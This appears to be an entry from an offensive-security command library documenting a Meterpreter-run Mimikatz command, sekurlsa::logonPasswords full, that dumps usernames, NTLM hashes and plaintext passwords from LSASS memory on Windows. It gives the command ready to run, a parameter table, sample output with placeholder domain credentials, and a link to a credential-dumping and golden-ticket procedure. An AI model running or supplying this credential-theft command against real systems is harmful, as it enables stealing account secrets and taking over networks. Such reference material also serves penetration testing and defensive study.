---
type: command
executor: meterpreter
data: 'mimikatz_command -f sekurlsa::logonPasswords full'
output: null
platforms:
  - Windows
tags:
  - mimikatz
  - logon-creds
verified: true
validated: true
---

# mimikatz-sekurlsa-logon-passwords-full

## Command

```meterpreter
mimikatz_command -f sekurlsa::logonPasswords full
```

## Description

Dumps full details of all active logon sessions, including usernames, domains, NTLM hashes, and any available plaintext passwords from LSASS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -f sekurlsa::logonPasswords | Dumps logon passwords module | Yes |
| full | Includes all available details (hashes, keys, etc.) | Yes |

## Examples

### Basic Usage

```meterpreter
mimikatz_command -f sekurlsa::logonPasswords full
```

## Expected Output

Authentication Id : 0 ; 123456
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 1/1/2023 12:00:00 AM
SID               : S-1-5-21-...

    msv :
      [00070003] Primary
       * Username : Administrator
       * Domain   : CONTOSO
       * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
      tspkg :
      wdigest :
       * Username : Administrator
       * Domain   : CONTOSO
       * Password : AdminPass123
      kerberos :
       * Username : Administrator
       * Domain   : CONTOSO
       ...

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
